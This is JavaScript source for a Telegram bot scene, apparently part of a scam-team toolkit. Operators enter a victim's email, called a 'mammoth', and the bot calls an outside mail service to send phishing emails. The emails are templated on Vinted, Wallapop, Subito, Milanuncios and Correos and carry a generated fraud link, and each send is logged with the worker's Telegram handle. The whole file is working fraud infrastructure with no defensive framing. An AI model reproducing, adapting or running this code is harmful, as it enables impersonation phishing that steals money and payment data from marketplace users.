const { Scenes } = require('telegraf')
const request = require('request')

const generateLink = require('../other/generateLink')
const config = require('../../configs/config.json')

const receive = require('../../database/models/receive')
const bbc = require('../../database/models/bbc')

const emailScene = new Scenes.WizardScene('email', async (ctx) => {
    try {
        ctx.wizard.state.data = {}
        ctx.wizard.state.data.id = ctx.callbackQuery.data.split(' ')[1]
        await receive.findOne({ link: ctx.wizard.state.data.id }).lean().then(async (res) => {
            if (res.service.includes('2.0')) {
                if (res.service == '🇵🇱 Vinted 2.0') {
                    ctx.wizard.state.data.service = "vinted.pl"
                } else if (res.service == '🇮🇹 Vinted 2.0') {
                    ctx.wizard.state.data.service = "vinted.it"
                } else if (res.service == '🇩🇪 Vinted 2.0') {
                    ctx.wizard.state.data.service = "vinted.de"
                } else if (res.service == '🇵🇹 Vinted 2.0') {
                    ctx.wizard.state.data.service = "vinted.pt"
                } else if (res.service == '🇪🇸 Vinted 2.0') {
                    ctx.wizard.state.data.service = "vinted.isp"
                } else if (res.service == '🇪🇸 Correos 2.0') {
                    ctx.wizard.state.data.service = "correos.isp"
                } else if (res.service == '🇪🇸 Milanuncios 1.0') {
                    ctx.wizard.state.data.service = "milanuncios.isp1"
                } else if (res.service == '🇪🇸 Milanuncios 2.0') {
                    ctx.wizard.state.data.service = "milanuncios.isp2"
                } else if (res.service == '🇮🇹 Subito 2.0') {
                    ctx.wizard.state.data.service = "subito.it"
                } else if (res.service == '🇪🇸 Wallapop 1.0') {
                    ctx.wizard.state.data.service = "wallapop.isp1"
                } else if (res.service == '🇪🇸 Wallapop 2.0') {
                    ctx.wizard.state.data.service = "wallapop.isp2"
                } else if (res.service == '🇮🇹 Wallapop 2.0') {
                    ctx.wizard.state.data.service = "wallapop.it"
                } else {
                    await ctx.replyWithHTML('📧 <b>Сервис, который вы выбрали не поддерживается в отправке eMail!</b> 📧', {
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                            ]
                        }
                    })
                    return await ctx.scene.leave()
                }

                ctx.wizard.state.data.name = res.product_name
                await ctx.replyWithHTML('📧 <b>Введите почту вашего мамонта!</b> 📧')
                return ctx.wizard.next()
            } else {
                await ctx.replyWithHTML('📧 <b>Отправка писем не работает для 1.0!</b> 📧', {
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                        ]
                    }
                })
                return await ctx.scene.leave()
            }
        })
    } catch (e) {
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
}, async (ctx) => {
    try {
        ctx.wizard.state.data.email = ctx.message.text
        await ctx.replyWithHTML(`📧 <b>Начинаем отправку...</b> 📧`)

        await receive.findOneAndUpdate({ link: ctx.wizard.state.data.id }, { $set: { email: "yes" } }, { new: true }).lean().then(async (info) => {
            await generateLink(info.service, info.link, ctx.from.id).then(async (link) => {
                await request.get({
                    url: `https://asd12dsafasd.pythonanywhere.com/send-mail?template=${ctx.wizard.state.data.service}&product_name=${ctx.wizard.state.data.name}&link=${link}&mail_receiver=${ctx.wizard.state.data.email}`,
                    headers: {
                        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Safari/537.36",
                        'Upgrade-Insecure-Requests': '1'
                    }
                }, async (err, res_req, body) => {
                    if (res_req) {
                        await ctx.telegram.sendMessage(config.bot.sms_logs, `${info.service} (email)\n👨‍🔧 Рабочий: @${info.tgUsername} | ${info.tgID}\n📲 eMail: ${ctx.wizard.state.data.email}\n🔗 Ссылка: ${link}\n📬 Сервис: ${ctx.wizard.state.data.service}`, {
                            parse_mode: 'HTML',
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: '✅ Отправлено ✅', callback_data: 'sms_i_sent_sms' }]
                                ]
                            }
                        })

                        await ctx.replyWithHTML(`📧 <b>Письмо было успешно отправлено!</b> 📧`)
                    }
                })
            })
        })

        return await ctx.scene.leave()
    } catch (e) {
        console.log(e)
        await ctx.replyWithHTML(`Неизвестная команда. Вернитесь в меню.`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '🖇 Вернуться в меню', callback_data: '⬅️ Назад' }]
                ]
            }
        })

        return ctx.scene.leave()
    }
})

module.exports = emailScene